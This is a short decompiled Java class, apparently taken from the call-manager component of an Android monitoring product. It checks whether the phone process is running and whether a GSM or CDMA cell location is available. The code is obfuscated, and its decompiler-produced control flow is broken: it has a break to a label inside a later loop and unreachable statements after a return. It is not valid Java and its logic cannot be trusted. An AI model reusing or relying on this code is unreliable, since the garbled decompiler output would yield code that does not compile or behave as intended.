package com.vvt.callmanager.a;

import android.content.Context;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import com.vvt.callmanager.ref.g;
import com.vvt.shell.j;

public class k {

    private static final boolean a = g.a;

    public static boolean a(Context paramContext) {
        boolean bool1 = true;
        boolean bool2 = j.a("com.android.phone");
        CellLocation localCellLocation = ((TelephonyManager)paramContext.getSystemService("phone")).getCellLocation();
        boolean bool4;
        if (localCellLocation != null) {
            boolean bool3 = localCellLocation instanceof GsmCellLocation;
            if (!bool3) {
                bool4 = localCellLocation instanceof CdmaCellLocation;
                if (!bool4) {}
            } else {
                bool4 = bool1;
                bool3 = a;
                if ((bool3) && ((!bool2) || (!bool4))) {
                    break label79;
                }
            }
        }
        for (;;)
        {
            return bool1;
            bool4 = false;
            localCellLocation = null;
            break;
            label79:
            bool1 = false;
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/getInstance/k.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */